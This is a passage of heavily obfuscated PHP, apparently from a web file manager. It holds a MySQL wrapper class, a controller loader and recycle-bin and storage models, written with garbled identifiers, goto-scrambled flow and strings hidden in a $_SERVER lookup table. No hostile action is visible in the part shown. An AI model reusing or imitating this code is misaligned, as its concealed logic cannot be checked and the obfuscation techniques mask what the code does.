remove($d‚£©ã•…, $aì„Ú„¯ê® = false) { unset($_COOKIE[$d‚£©ã•…]); self::set($d‚£©ã•…, $_SERVER[í™][33], 1, $aì„Ú„¯ê®); } } if (!isset($_SERVER[$_SERVER[í™][736]]) || !isset($_SERVER[$_SERVER[í™][737]])) { goto DˆºÂ°êÉº; Eœ§»Ü¬ç¾: $b®Å“±àó = explode($_SERVER[í™][217], $DŒÇ „Šï•); if (count($b®Å“±àó) < $_SERVER[í™][577]) { $d¶œ¥ù—‡‹ = $_SERVER[í™][741]; $d¶œ¥ù—‡‹(); } $CöÖŞ¬µÇŒ = $_SERVER[í™][742]; goto CËáÃ’“‡; CËáÃ’“‡: $CöÖŞ¬µÇŒ($_SERVER[$_SERVER[í™][739]] . $_SERVER[í™][740]); $d²ŒÁ»Šœ° = 2; while ($d²ŒÁ»Šœ° > 1) { $D ù¾Ğ’’Ù = rawurlencode($d²ŒÁ»Šœ° . $_SERVER[í™][361]); } goto eîà©°„; DˆºÂ°êÉº: $cÂÑÇœîÏ = $_SERVER[í™][738]; $b°¼—öò = $_SERVER[$_SERVER[í™][739]] . $_SERVER[í™][740]; $DŒÇ „Šï• = $cÂÑÇœîÏ($b°¼—öò); goto Eœ§»Ü¬ç¾; eîà©°„: } class DbMysql extends Db { public function __construct($fÏø£‰«¡ = '') { $a¤ÉßÛ›¢ =& $_SERVER[í™]; if (!extension_loaded($a¤ÉßÛ›¢[709])) { think_exception(think_lang($a¤ÉßÛ›¢[10]) . $a¤ÉßÛ›¢[783]); } if (!empty($fÏø£‰«¡)) { $this->config = $fÏø£‰«¡; if (empty($this->config[$a¤ÉßÛ›¢[13]])) { $this->config[$a¤ÉßÛ›¢[13]] = $a¤ÉßÛ›¢[33]; } } } public function connect($A•´£§—î = '', $f°ŒË§¶Ÿ¬ = 0, $FÍ‰â„‘º  = false) { $cŠÑİŞÄ‹õ =& $_SERVER[í™]; if (!isset($this->linkID[$f°ŒË§¶Ÿ¬])) { goto DºùÂ°·ÒÅ; AÖ‡´¤„Ü: if (1 != think_config($cŠÑİŞÄ‹õ[18])) { unset($this->config); } goto c‰¼½àƒØ÷; BŒººóíåŒ: if ($bÛÆ‰¥‹öº) { $this->linkID[$f°ŒË§¶Ÿ¬] = mysql_pconnect($DÛ×Äë, $A•´£§—î[$cŠÑİŞÄ‹õ[786]], $A•´£§—î[$cŠÑİŞÄ‹õ[787]], 131072); } else { $this->linkID[$f°ŒË§¶Ÿ¬] = mysql_connect($DÛ×Äë, $A•´£§—î[$cŠÑİŞÄ‹õ[786]], $A•´£§—î[$cŠÑİŞÄ‹õ[787]], !0, 131072); } if (!$this->linkID[$f°ŒË§¶Ÿ¬] || !empty($A•´£§—î[$cŠÑİŞÄ‹õ[17]]) && !mysql_select_db($A•´£§—î[$cŠÑİŞÄ‹õ[17]], $this->linkID[$f°ŒË§¶Ÿ¬])) { think_exception(mysql_error()); } $cß¹äƒÌÏ = mysql_get_server_info($this->linkID[$f°ŒË§¶Ÿ¬]); goto FÌ‹®—àµ¶; DºùÂ°·ÒÅ: if (empty($A•´£§—î)) { $A•´£§—î = $this->config; } $DÛ×Äë = $A•´£§—î[$cŠÑİŞÄ‹õ[784]] . ($A•´£§—î[$cŠÑİŞÄ‹õ[785]] ? "\x3a{$A•´£§—î[$cŠÑİŞÄ‹õ[785]]}" : $cŠÑİŞÄ‹õ[33]); $bÛÆ‰¥‹öº = !empty($A•´£§—î[$cŠÑİŞÄ‹õ[13]][$cŠÑİŞÄ‹õ[14]]) ? $A•´£§—î[$cŠÑİŞÄ‹õ[13]][$cŠÑİŞÄ‹õ[14]] : $this->pconnect; goto BŒººóíåŒ; FÌ‹®—àµ¶: mysql_query($cŠÑİŞÄ‹õ[788] . think_config($cŠÑİŞÄ‹õ[789]) . $cŠÑİŞÄ‹õ[55], $this->linkID[$f°ŒË§¶Ÿ¬]); if ($cß¹äƒÌÏ > $cŠÑİŞÄ‹õ[790]) { mysql_query($cŠÑİŞÄ‹õ[791], $this->linkID[$f°ŒË§¶Ÿ¬]); } $this->connected = !0; goto AÖ‡´¤„Ü; c‰¼½àƒØ÷: } return $this->linkID[$f°ŒË§¶Ÿ¬]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($b§ø‘®Š°ê) { goto a„éÑô¦¹·; d‚´·Æ¦µç: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto D²İãÌ¸; a„éÑô¦¹·: $f‚´ôæ§ª¥ =& $_SERVER[í™]; if (0 === stripos($b§ø‘®Š°ê, $f‚´ôæ§ª¥[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto C§º†‘ùÔ; f×ÙïÕ²ÖÔ: think_action_status($f‚´ôæ§ª¥[19], 1); think_status($f‚´ôæ§ª¥[20]); $this->queryID = mysql_query($b§ø‘®Š°ê, $this->_linkID); goto d‚´·Æ¦µç; C§º†‘ùÔ: if (!$this->_linkID) { return !1; } $this->queryStr = $b§ø‘®Š°ê; if ($this->queryID) { $this->free(); } goto f×ÙïÕ²ÖÔ; D²İãÌ¸: } public function execute($bì¦½Û¾›İ) { goto c¶Æğ¡•Â˜; e¨ØçŠ¶Û…: if (!1 === $f‰…ã‘ù©) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto f‡Ş—­; b¦¦âˆì©§: $this->queryStr = $bì¦½Û¾›İ; if ($this->queryID) { $this->free(); } think_action_status($A›èá¤È‹Ğ[21], 1); goto a¦½Ã¸Ñ¾È; c¶Æğ¡•Â˜: $A›èá¤È‹Ğ =& $_SERVER[í™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b¦¦âˆì©§; a¦½Ã¸Ñ¾È: think_status($A›èá¤È‹Ğ[20]); $f‰…ã‘ù© = mysql_query($bì¦½Û¾›İ, $this->_linkID); $this->debug(); goto e¨ØçŠ¶Û…; f‡Ş—­: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[í™][792], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A´ÔÙ‘ÒùÀ = mysql_query($_SERVER[í™][793], $this->_linkID); $this->transTimes = 0; if (!$A´ÔÙ‘ÒùÀ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dÈ©–ç÷‰§ = mysql_query($_SERVER[í™][794], $this->_linkID); $this->transTimes = 0; if (!$dÈ©–ç÷‰§) { $this->error(); return !1; } } return !0; } private function getAll() { $fõÎ‡–†¢è = array(); if ($this->numRows > 0) { while ($e’”ã¨Ç = mysql_fetch_assoc($this->queryID)) { $fõÎ‡–†¢è[] = $e’”ã¨Ç; } mysql_data_seek($this->queryID, 0); } return $fõÎ‡–†¢è; } public function getFields($DÙÛšµˆÔï) { $Bê°¾„šÎñ =& $_SERVER[í™]; $c“Ãó±³…— = $this->query($Bê°¾„šÎñ[795] . $this->parseKey($DÙÛšµˆÔï)); $b¿±»ëë¡ = array(); if ($c“Ãó±³…—) { foreach ($c“Ãó±³…— as $bÙ¶Æè„Ûå => $fÌŸÚ±‡ …) { $b¿±»ëë¡[$fÌŸÚ±‡ …[$Bê°¾„šÎñ[27]]] = array($Bê°¾„šÎñ[28] => $fÌŸÚ±‡ …[$Bê°¾„šÎñ[27]], $Bê°¾„šÎñ[29] => $fÌŸÚ±‡ …[$Bê°¾„šÎñ[30]], $Bê°¾„šÎñ[31] => (bool) (strtoupper($fÌŸÚ±‡ …[$Bê°¾„šÎñ[32]]) === $Bê°¾„šÎñ[796]), $Bê°¾„šÎñ[34] => $fÌŸÚ±‡ …[$Bê°¾„šÎñ[35]], $Bê°¾„šÎñ[36] => strtolower($fÌŸÚ±‡ …[$Bê°¾„šÎñ[37]]) == $Bê°¾„šÎñ[38], $Bê°¾„šÎñ[39] => strtolower($fÌŸÚ±‡ …[$Bê°¾„šÎñ[40]]) == $Bê°¾„šÎñ[41]); } } return $b¿±»ëë¡; } public function getTables($Båõ˜Ä‘‡’ = '') { $F…¯Ëá¤ÙÁ =& $_SERVER[í™]; if (!empty($Båõ˜Ä‘‡’)) { $CØ‡‡¢½Ù = $F…¯Ëá¤ÙÁ[797] . $Båõ˜Ä‘‡’; } else { $CØ‡‡¢½Ù = $F…¯Ëá¤ÙÁ[798]; } $e¼›«”Š¢ô = $this->query($CØ‡‡¢½Ù); $AÉ‹ƒ»×¥Ş = array(); foreach ($e¼›«”Š¢ô as $AÕâ‡Ò…˜í => $dÖ‹†±êôĞ) { $AÉ‹ƒ»×¥Ş[$AÕâ‡Ò…˜í] = current($dÖ‹†±êôĞ); } return $AÉ‹ƒ»×¥Ş; } public function replace($a×ÙØòÁˆ, $c—ğ½…Üã… = array()) { $cğ¬ÃœŒ¯ =& $_SERVER[í™]; foreach ($a×ÙØòÁˆ as $b…§¥£à÷ => $F§‹¿Şà·) { $B‹’ŠÈ—ç½ = $this->parseValue($F§‹¿Şà·); if (is_scalar($B‹’ŠÈ—ç½)) { $D­àÏ²“¦Ù[] = $B‹’ŠÈ—ç½; $E½†”×á½«[] = $this->parseKey($b…§¥£à÷); } } $B¤ëª¶­’„ = $cğ¬ÃœŒ¯[799] . $this->parseTable($c—ğ½…Üã…[$cğ¬ÃœŒ¯[267]]) . $cğ¬ÃœŒ¯[800] . implode($cğ¬ÃœŒ¯[47], $E½†”×á½«) . $cğ¬ÃœŒ¯[801] . implode($cğ¬ÃœŒ¯[47], $D­àÏ²“¦Ù) . $cğ¬ÃœŒ¯[802]; return $this->execute($B¤ëª¶­’„); } public function insertAll($bõ‚›­ŒÖª, $Bó·ŒÅ¬Ç = array(), $FÄáòãÒÃ = false) { goto d¥¿ÈÑÁ›­; BØ–®—¿ø°: $CÃ¬ëÓ¸Êš = ($FÄáòãÒÃ ? $B•È‰æØÓ¶[804] : $B•È‰æØÓ¶[805]) . $B•È‰æØÓ¶[806] . $this->parseTable($Bó·ŒÅ¬Ç[$B•È‰æØÓ¶[267]]) . $B•È‰æØÓ¶[800] . implode($B•È‰æØÓ¶[47], $F”¾ÏšÃÏó) . $B•È‰æØÓ¶[807] . implode($B•È‰æØÓ¶[47], $dÛ³Úåì); return $this->execute($CÃ¬ëÓ¸Êš); goto a¬¼ÕÂÚ¬; e‰ßŠôŒœ: $dÛ³Úåì = array(); foreach ($bõ‚›­ŒÖª as $e¯‚Á“ˆŒÅ) { $fÎ°ŠÇ©ìã = array(); foreach ($e¯‚Á“ˆŒÅ as $dŠŞªÀ¢ÂÎ => $e²Á–Ï¥œÇ) { $e²Á–Ï¥œÇ = $this->parseValue($e²Á–Ï¥œÇ); if (is_scalar($e²Á–Ï¥œÇ)) { $fÎ°ŠÇ©ìã[] = $e²Á–Ï¥œÇ; } } $dÛ³Úåì[] = $B•È‰æØÓ¶[248] . implode($B•È‰æØÓ¶[47], $fÎ°ŠÇ©ìã) . $B•È‰æØÓ¶[802]; } array_walk($F”¾ÏšÃÏó, array($this, $B•È‰æØÓ¶[803])); goto BØ–®—¿ø°; d¥¿ÈÑÁ›­: $B•È‰æØÓ¶ =& $_SERVER[í™]; if (!is_array($bõ‚›­ŒÖª[0])) { return !1; } $F”¾ÏšÃÏó = array_keys($bõ‚›­ŒÖª[0]); goto e‰ßŠôŒœ; a¬¼ÕÂÚ¬: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fÈãáä²‹´ =& $_SERVER[í™]; $this->error = mysql_errno() . $fÈãáä²‹´[4] . mysql_error($this->_linkID); if ($fÈãáä²‹´[33] != $this->queryStr) { $this->error .= LNG($fÈãáä²‹´[45]) . $this->queryStr; } think_trace($this->error, $fÈãáä²‹´[33], $fÈãáä²‹´[46]); return $this->error; } public function escapeString($eÍ‹¬ëÖª“) { if ($this->_linkID) { return mysql_real_escape_string($eÍ‹¬ëÖª“, $this->_linkID); } else { return mysql_escape_string($eÍ‹¬ëÖª“); } } public function parseKey(&$c¼£„Èçö˜, $A¾¯­‘ÔŠ‰ = true) { $dêÇ«ÊİÜ =& $_SERVER[í™]; if ($A¾¯­‘ÔŠ‰) { $c¼£„Èçö˜ = $this->parseKeyCheck($c¼£„Èçö˜); } if ($c¼£„Èçö˜ != $dêÇ«ÊİÜ[176] && !preg_match($dêÇ«ÊİÜ[808], $c¼£„Èçö˜)) { $c¼£„Èçö˜ = $dêÇ«ÊİÜ[809] . trim($c¼£„Èçö˜, $dêÇ«ÊİÜ[809]) . $dêÇ«ÊİÜ[809]; } return $c¼£„Èçö˜; } } goto e¡Ú…Àâ†è; cùõ¯¦‚»”: function Action($CöÊœ’ŒÑ° = '') { goto F…Û…ˆª‹‹; d½Ê™È‚¯¥: $eÍà’…„’– = strtolower($A’ÌŒÁ¯«‡[0]); if (substr($eÍà’…„’–, -6) == $CÈõ§õƒ®[6]) { $CöÊœ’ŒÑ° = substr($A’ÌŒÁ¯«‡[0], 0, -6); $bñ¤®ñŒ = $CöÊœ’ŒÑ° . $CÈõ§õƒ®[7]; $fÚ¨±Ù¬Ä = $CÈõ§õƒ®[8]; if (isset($A’ÌŒÁ¯«‡[1]) && substr(strtolower($A’ÌŒÁ¯«‡[1]), -5) == $CÈõ§õƒ®[9]) { $bñ¤®ñŒ = $CöÊœ’ŒÑ° . $A’ÌŒÁ¯«‡[1]; $fÚ¨±Ù¬Ä = $CÈõ§õƒ®[10] . $A’ÌŒÁ¯«‡[1] . $CÈõ§õƒ®[11]; } else { if (count($A’ÌŒÁ¯«‡) == 3) { $bñ¤®ñŒ = $CöÊœ’ŒÑ° . $A’ÌŒÁ¯«‡[1] . $A’ÌŒÁ¯«‡[2]; $fÚ¨±Ù¬Ä = $CÈõ§õƒ®[12] . $A’ÌŒÁ¯«‡[1] . $CÈõ§õƒ®[13] . $A’ÌŒÁ¯«‡[2] . $CÈõ§õƒ®[11]; } } $fÚ¨±Ù¬Ä = PLUGIN_DIR . $CöÊœ’ŒÑ° . $CÈõ§õƒ®[4] . $fÚ¨±Ù¬Ä; } else { if (substr($eÍà’…„’–, -5) == $CÈõ§õƒ®[9]) { $CöÊœ’ŒÑ° = substr($A’ÌŒÁ¯«‡[0], 0, -5); return Model($CöÊœ’ŒÑ°); } else { $bñ¤®ñŒ = $A’ÌŒÁ¯«‡[0] . $A’ÌŒÁ¯«‡[1]; $fÚ¨±Ù¬Ä = CONTROLLER_DIR . $A’ÌŒÁ¯«‡[0] . $CÈõ§õƒ®[4] . $A’ÌŒÁ¯«‡[1] . $CÈõ§õƒ®[14]; } } $Cï¥Œ¡º†„ = strtolower($bñ¤®ñŒ); goto e½Š†½ÕÔ; BŒáË¿¦ë: $A†Ÿ¶®…ß†[$Cï¥Œ¡º†„] = new $bñ¤®ñŒ(); $A†Ÿ¶®…ß†[$a· Ş×œù·] = $A†Ÿ¶®…ß†[$Cï¥Œ¡º†„]; return $A†Ÿ¶®…ß†[$Cï¥Œ¡º†„]; goto dàÃ¶µ¬ëÜ; F…Û…ˆª‹‹: $CÈõ§õƒ® =& $_SERVER[ñâ]; static $A†Ÿ¶®…ß† = array(); $a· Ş×œù· = $CöÊœ’ŒÑ°; goto E“¯´é‘ˆ; e½Š†½ÕÔ: if (isset($A†Ÿ¶®…ß†[$Cï¥Œ¡º†„])) { return $A†Ÿ¶®…ß†[$Cï¥Œ¡º†„]; } if (is_file($fÚ¨±Ù¬Ä)) { include_once $fÚ¨±Ù¬Ä; } if (!class_exists($bñ¤®ñŒ)) { return actionCallError("\133{$CöÊœ’ŒÑ°}\x20\x3d\x3e\40{$bñ¤®ñŒ}\x5d\40\143\154\141\x73\x73\40\x6e\x6f\x74\x20\x65\x78\x69\163\164\163\x21"); } goto BŒáË¿¦ë; E“¯´é‘ˆ: if (isset($A†Ÿ¶®…ß†[$a· Ş×œù·])) { return $A†Ÿ¶®…ß†[$a· Ş×œù·]; } $CöÊœ’ŒÑ° = trim(str_replace($CÈõ§õƒ®[4], $CÈõ§õƒ®[5], $CöÊœ’ŒÑ°), $CÈõ§õƒ®[4]); $A’ÌŒÁ¯«‡ = explode($CÈõ§õƒ®[5], $CöÊœ’ŒÑ°); goto d½Ê™È‚¯¥; dàÃ¶µ¬ëÜ: } function ActionApply($EÈïíÌƒ³–, $b˜†¾°…»¹ = array()) { goto a›—‰à¶‰‘; a›—‰à¶‰‘: if (is_array($EÈïíÌƒ³–)) { return call_user_func_array($EÈïíÌƒ³–, $b˜†¾°…»¹); } if (function_exists($EÈïíÌƒ³–)) { return call_user_func_array($EÈïíÌƒ³–, $b˜†¾°…»¹); } $CÉˆ¶‚·µ° = strrpos($EÈïíÌƒ³–, $_SERVER[ñâ][5]); goto Eùí¸òÊ›Ş; Eùí¸òÊ›Ş: $Eä”í¼Ä¼À = substr($EÈïíÌƒ³–, 0, $CÉˆ¶‚·µ°); $E˜„×çŒç÷ = substr($EÈïíÌƒ³–, $CÉˆ¶‚·µ° + 1); $eÄÃ²ÂÅŠç = Action($Eä”í¼Ä¼À); goto E”Üçõª²¿; E”Üçõª²¿: if (!method_exists($eÄÃ²ÂÅŠç, $E˜„×çŒç÷)) { return actionCallError("{$EÈïíÌƒ³–}\40\x6d\x65\164\x68\157\144\x20\x6e\x6f\164\40\145\170\x69\x73\x74\x73\41"); } $D÷²ß øŒÅ = call_user_func_array(array($eÄÃ²ÂÅŠç, $E˜„×çŒç÷), $b˜†¾°…»¹); return $D÷²ß øŒÅ; goto f«£ñ¤§ª; f«£ñ¤§ª: } function actionCallError($C©ù÷Å¿­ï) { return write_log($C©ù÷Å¿­ï, $_SERVER[ñâ][15]); } goto Fë—éšëÃ; a„‘áó©Äî: define($_SERVER[í™][1924], 4); define($_SERVER[í™][1925], 5); define($_SERVER[í™][1926], 16); goto C‰¡ÄĞº’œ; F–À†©Œ©‘: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\x63\x65\137\162\x65\143\171\x63\x6c\145"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\124\x69\155\x65", "\x74\x69\x6d\145", "\151\x6e\x73\145\x72\164", "\146\x75\156\143\x74\x69\157\x6e")); public function listData($EÕŒÃÓãÄª = false) { $bŸËçŒˆ³İ =& $_SERVER[í™]; $EÕŒÃÓãÄª = $EÕŒÃÓãÄª ? $EÕŒÃÓãÄª : USER_ID; $dƒŒâ´‰ñ¾ = $this->where(array($bŸËçŒˆ³İ[1414] => $EÕŒÃÓãÄª))->select(); return array_to_keyvalue($dƒŒâ´‰ñ¾, $bŸËçŒˆ³İ[33], $bŸËçŒˆ³İ[369]); } public function moveToRecycle($B±ºôË¸æ§) { goto dÒ¾¤³çÓ¾; dÒ¾¤³çÓ¾: $fò˜´¢é¬Â =& $_SERVER[í™]; $c‚‹îò¬¹‰ = Model($fò˜´¢é¬Â[1103]); $D·¥¢øá• = $c‚‹îò¬¹‰->sourceInfo($B±ºôË¸æ§); goto F£Õ¢ïå‘ä; d‰•ÔôßˆÉ: $this->recycleMove($B±ºôË¸æ§, 1); if ($D·¥¢øá•[$fò˜´¢é¬Â[370]] == $fò˜´¢é¬Â[83]) { $E·Ş¢ëæÎ = array($fò˜´¢é¬Â[527] => array($fò˜´¢é¬Â[485], $D·¥¢øá•[$fò˜´¢é¬Â[461]] . $B±ºôË¸æ§ . $fò˜´¢é¬Â[486])); $c‚‹îò¬¹‰->where($E·Ş¢ëæÎ)->setField($fò˜´¢é¬Â[397], 1); } goto a‘œ’ÑÉ»¥; F£Õ¢ïå‘ä: if (!$D·¥¢øá• || $D·¥¢øá•[$fò˜´¢é¬Â[397]] == $fò˜´¢é¬Â[83]) { return; } $b¸óÑ­È…¶ = array($fò˜´¢é¬Â[383] => $B±ºôË¸æ§, $fò˜´¢é¬Â[1414] => USER_ID, $fò˜´¢é¬Â[523] => $D·¥¢øá•[$fò˜´¢é¬Â[371]], $fò˜´¢é¬Â[524] => $D·¥¢øá•[$fò˜´¢é¬Â[458]], $fò˜´¢é¬Â[527] => $D·¥¢øá•[$fò˜´¢é¬Â[461]]); $this->add($b¸óÑ­È…¶); goto d‰•ÔôßˆÉ; a‘œ’ÑÉ»¥: } public function clear() { $this->remove(!1); } public function remove($eù‹„ƒã© = false) { goto bˆ¶‚ó³¶¶; F¯ôÂÂ§İ: foreach ($eƒˆ‹»¤Ê as $FßÏ±¢å‡¤) { $C¯Ô‰ëŒ¨›->targetSpaceUpdate($FßÏ±¢å‡¤[$Dšœ½¥öä¢[371]], $FßÏ±¢å‡¤[$Dšœ½¥öä¢[458]]); } goto b‡èøà²è¤; cÓ†–ˆæÖ: $eù‹„ƒã© = $eù‹„ƒã© === !1 ? !1 : $eù‹„ƒã©; $eƒˆ‹»¤Ê = array(); foreach ($BÎ‡Öµ‡­ as $cÊëè¬±‚Ô) { if ($eù‹„ƒã© != !1 && !in_array($cÊëè¬±‚Ô, $eù‹„ƒã©)) { continue; } $fâå¾¸‡Ú“ = $C¯Ô‰ëŒ¨›->sourceInfo($cÊëè¬±‚Ô); $C¯Ô‰ëŒ¨›->remove($cÊëè¬±‚Ô, !1); $bİÜµôÊğ£ = $fâå¾¸‡Ú“[$Dšœ½¥öä¢[371]] . $Dšœ½¥öä¢[70] . $fâå¾¸‡Ú“[$Dšœ½¥öä¢[458]]; $eƒˆ‹»¤Ê[$bİÜµôÊğ£] = array($Dšœ½¥öä¢[523] => $fâå¾¸‡Ú“[$Dšœ½¥öä¢[371]], $Dšœ½¥öä¢[458] => $fâå¾¸‡Ú“[$Dšœ½¥öä¢[458]]); $this->where(array($Dšœ½¥öä¢[369] => $cÊëè¬±‚Ô))->delete(); } goto F¯ôÂÂ§İ; bˆ¶‚ó³¶¶: $Dšœ½¥öä¢ =& $_SERVER[í™]; $C¯Ô‰ëŒ¨› = Model($Dšœ½¥öä¢[1103]); $BÎ‡Öµ‡­ = $this->listData(); goto cÓ†–ˆæÖ; b‡èøà²è¤: } public function restore($c“­¡£¢½ = false) { goto b°áËÙˆİ‡; b°áËÙˆİ‡: $FµßË…Ÿã =& $_SERVER[í™]; $B¡êÁÒ·áÅ = Model($FµßË…Ÿã[1103]); $eµô¥š¡´½ = $this->listData(); goto eîÓ£¨ò¸„; d›ùÁÁĞ¯Æ: foreach ($eµô¥š¡´½ as $b›ÙŠÌ¥) { goto A‡Ü¥ï³Æ; A¬„ùß’è–: if ($EõìÃÛ‡õ[$FµßË…Ÿã[397]] == $FµßË…Ÿã[83]) { continue; } $B¡êÁÒ·áÅ->lockMoveStart($b›ÙŠÌ¥); $this->recycleMove($b›ÙŠÌ¥, 0); goto dàÅÈÊ†¹; A‡Ü¥ï³Æ: if ($c“­¡£¢½ != !1 && !in_array($b›ÙŠÌ¥, $c“­¡£¢½)) { continue; } $d†ï¡¶ùå = $B¡êÁÒ·áÅ->sourceInfo($b›ÙŠÌ¥); $EõìÃÛ‡õ = $B¡êÁÒ·áÅ->sourceInfo($d†ï¡¶ùå[$FµßË…Ÿã[463]]); goto A¬„ùß’è–; f¡¤ªÛ¢øã: $C³âë´åš¬[] = $d†ï¡¶ùå[$FµßË…Ÿã[463]]; if ($d†ï¡¶ùå[$FµßË…Ÿã[370]] == $FµßË…Ÿã[83]) { $C³âë´åš¬[] = $b›ÙŠÌ¥; } $B¡êÁÒ·áÅ->lockMoveEnd($b›ÙŠÌ¥); goto f¶…™¹Ë‘’; dàÅÈÊ†¹: if ($d†ï¡¶ùå[$FµßË…Ÿã[370]] == $FµßË…Ÿã[83]) { $aÑ‡Çº–à = array($FµßË…Ÿã[527] => array($FµßË…Ÿã[485], $d†ï¡¶ùå[$FµßË…Ÿã[461]] . $b›ÙŠÌ¥ . $FµßË…Ÿã[486])); $B¡êÁÒ·áÅ->where($aÑ‡Çº–à)->setField($FµßË…Ÿã[397], 0); $this->restoreFolderChildren($b›ÙŠÌ¥, $eµô¥š¡´½); } $this->where(array($FµßË…Ÿã[369] => $b›ÙŠÌ¥))->delete(); $B¡êÁÒ·áÅ->folderSizeReset($d†ï¡¶ùå[$FµßË…Ÿã[463]]); goto f¡¤ªÛ¢øã; f¶…™¹Ë‘’: } $B¡êÁÒ·áÅ->updateModifyTime($C³âë´åš¬); goto bâÆ´™×Ä˜; eîÓ£¨ò¸„: $c“­¡£¢½ = $c“­¡£¢½ == !1 ? !1 : $c“­¡£¢½; if (!$eµô¥š¡´½) { return !0; } $C³âë´åš¬ = array(); goto d›ùÁÁĞ¯Æ; bâÆ´™×Ä˜: } private function restoreFolderChildren($FÂÅÔ§Š‹…, $dÇìƒÇù²‚) { goto B§Ëœ‰è˜‘; b‘ÎÂ²ë‡ø: foreach ($dÇìƒÇù²‚ as $f™ÍÇ×‰Úˆ) { if ($f™ÍÇ×‰Úˆ == $FÂÅÔ§Š‹…) { continue; } if (!$FÀ‹…¼™ ¡->isParentOf($FÂÅÔ§Š‹…, $f™ÍÇ×‰Úˆ)) { continue; } $Bçì²ÀÔ´ = $FÀ‹…¼™ ¡->sourceInfo($f™ÍÇ×‰Úˆ); if ($Bçì²ÀÔ´[$eçíã”ë[370]] == $eçíã”ë[83]) { $E¢Ú½’[] = array($eçíã”ë[527] => array($eçíã”ë[485], $Bçì²ÀÔ´[$eçíã”ë[461]] . $f™ÍÇ×‰Úˆ . $eçíã”ë[486])); } else { $E¢Ú½’[$eçíã”ë[369]][1][] = $f™ÍÇ×‰Úˆ; } } if (!$E¢Ú½’[$eçíã”ë[369]][1]) { unset($E¢Ú½’[$eçíã”ë[369]]); } if (!$E¢Ú½’) { return; } goto fÁÜã˜îŠ; fÁÜã˜îŠ: $E¢Ú½’[$eçíã”ë[369]][1] = array_unique($E¢Ú½’[$eçíã”ë[369]][1]); $E¢Ú½’[$eçíã”ë[899]] = $eçíã”ë[2178]; $FÀ‹…¼™ ¡->where($E¢Ú½’)->setField($eçíã”ë[397], 1); goto A¼Û›—÷§Ñ; B§Ëœ‰è˜‘: $eçíã”ë =& $_SERVER[í™]; $FÀ‹…¼™ ¡ = Model($eçíã”ë[1103]); $E¢Ú½’ = array($eçíã”ë[369] => array($eçíã”ë[7], array())); goto b‘ÎÂ²ë‡ø; A¼Û›—÷§Ñ: } private function recycleMove($AàĞ¨ØøßĞ, $fõ»Œ»†¬Ã = 1) { $bÄ”³ÇóË =& $_SERVER[í™]; $aš˜Ú¯ ’Ê = Model($bÄ”³ÇóË[1103]); $fÑ¨âì©¦¾ = Model($bÄ”³ÇóË[2368]); $f˜‰ËÍéÓ = array($bÄ”³ÇóË[369] => $AàĞ¨ØøßĞ); if ($fõ»Œ»†¬Ã) { $aš˜Ú¯ ’Ê->where($f˜‰ËÍéÓ)->setField($bÄ”³ÇóË[397], 1); $fÑ¨âì©¦¾->eventRecycle($AàĞ¨ØøßĞ, $bÄ”³ÇóË[2369]); } else { $eÍ¥ßÅÙñá = $aš˜Ú¯ ’Ê->where($f˜‰ËÍéÓ)->find(); $E­¯•¶…ˆ = $eÍ¥ßÅÙñá[$bÄ”³ÇóË[370]] == $bÄ”³ÇóË[83]; $B½Ø¡òõÂø = $aš˜Ú¯ ’Ê->fileNameAuto($eÍ¥ßÅÙñá[$bÄ”³ÇóË[463]], $eÍ¥ßÅÙñá[$bÄ”³ÇóË[28]], REPEAT_RENAME_FOLDER, $E­¯•¶…ˆ); if ($B½Ø¡òõÂø != $eÍ¥ßÅÙñá[$bÄ”³ÇóË[28]]) { $aš˜Ú¯ ’Ê->rename($AàĞ¨ØøßĞ, $B½Ø¡òõÂø); } $aš˜Ú¯ ’Ê->where($f˜‰ËÍéÓ)->setField($bÄ”³ÇóË[397], 0); $fÑ¨âì©¦¾->eventRecycle($AàĞ¨ØøßĞ, $bÄ”³ÇóË[2370]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\x73\x74\157\162\141\x67\x65\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x73\151\x7a\x65\115\141\170", "\x73\x79\x73\x74\x65\x6d", "\x64\x65\x66\141\x75\x6c\x74", "\x64\162\151\166\145\x72", "\x63\157\x6e\146\x69\x67"); public function listData($dù†˜°“ğê = false, $Eİ¹óæÕª¯ = "\155\157\x64\151\146\171\x54\151\x6d\x65", $b²­¥›™Å = false) { goto DšŠÉİƒ˜; B£›ëÖßèŞ: foreach ($B–Œ¹Ù•Ú® as $C´Ø§«Öê­ => $cêË‡ØÁòŸ) { unset($B–Œ¹Ù•Ú®[$C´Ø§«Öê­][$d·ù®«Ğ¿Ì[6]]); $B–Œ¹Ù•Ú®[$C´Ø§«Öê­][$d·ù®«Ğ¿Ì[2080]] = 0; } $DÍ˜Œ§¡‘± = array_to_keyvalue($B–Œ¹Ù•Ú®, $d·ù®«Ğ¿Ì[33], $d·ù®«Ğ¿Ì[367]); $this->_listAppendSize($B–Œ¹Ù•Ú®, $DÍ˜Œ§¡‘±); goto dšò­Şàá; dšò­Şàá: return $B–Œ¹Ù•Ú®; goto aİÈø©ÜÆ; DšŠÉİƒ˜: $d·ù®«Ğ¿Ì =& $_SERVER[í™]; $B–Œ¹Ù•Ú® = parent::listData($dù†˜°“ğê, $Eİ¹óæÕª¯, $b²­¥›™Å); if ($dù†˜°“ğê) { return $B–Œ¹Ù•Ú®; } goto B£›ëÖßèŞ; aİÈø©ÜÆ: } public function _listAppendSize(&$A°¿ô“Ìğï, $dÛ¨ÖÔğÍ†) { $e„ÓÙÔ×´à =& $_SERVER[í™]; if (!$dÛ¨ÖÔğÍ†) { return; } $bµÆÎò¼ùŠ = $e„ÓÙÔ×´à[2371] . implode($e„ÓÙÔ×´à[47], $dÛ¨ÖÔğÍ†) 